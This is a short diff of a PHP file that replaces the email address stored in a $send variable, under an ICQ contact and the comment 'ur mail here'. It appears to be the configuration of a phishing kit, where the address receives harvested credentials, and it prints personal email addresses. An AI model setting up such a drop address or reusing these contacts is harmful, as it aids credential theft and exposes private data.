@@ -5,5 +5,5 @@
 	// ICQ: 686820464
 
 	//ur mail here.
-    $send = "jesusveralexanderlimon@gmail.com";
+    $send = "dsochero87@gmail.com";
 ?>
